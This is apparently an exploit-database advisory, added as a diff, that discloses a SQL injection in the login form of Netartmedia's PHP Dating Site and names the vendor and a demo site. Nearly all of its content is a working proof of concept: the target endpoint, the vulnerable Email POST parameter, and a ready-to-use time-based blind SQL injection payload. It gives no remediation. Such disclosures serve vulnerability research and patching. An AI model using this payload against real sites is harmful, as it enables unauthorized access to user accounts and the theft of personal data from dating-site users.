@@ -1,0 +1,16 @@
+# Exploit Title: Netartmedia Php Dating Site - SQL Injection
+# Date: 19.03.2019
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://www.netartmedia.net/datingsite/
+# Demo Site: https://www.phpscriptdemos.com/dating/
+# Version: Lastest
+# Tested on: Kali Linux
+# CVE: N/A
+# Description: PHP Dating Site is a complete web system for creating
+advanced and modern online dating websites.
+
+ ----- PoC SQLi -----
+
+Request: http://localhost/[PATH]/loginaction.php
+Parameter: Email (POST)
+Payload: Email=0'XOR(if(now()=sysdate()%2Csleep(0)%2C0))XOR'Z&Password=g00dPa%24%24w0rD&lang=en&mod=login
